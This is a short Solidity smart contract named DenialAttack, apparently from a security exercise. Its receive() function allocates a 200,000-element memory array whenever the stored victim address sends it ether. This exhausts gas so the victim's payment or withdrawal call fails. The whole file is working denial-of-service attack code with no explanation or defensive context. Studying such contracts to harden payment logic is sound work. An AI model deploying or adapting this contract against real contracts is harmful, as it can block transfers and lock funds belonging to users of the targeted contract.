// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract DenialAttack {
    address public victimAddress;

    constructor(address addr) {
        victimAddress = addr;
    }

    receive() external payable {
        if (msg.sender == victimAddress) {
            uint256[200000] memory myArray;
        }
    }
}
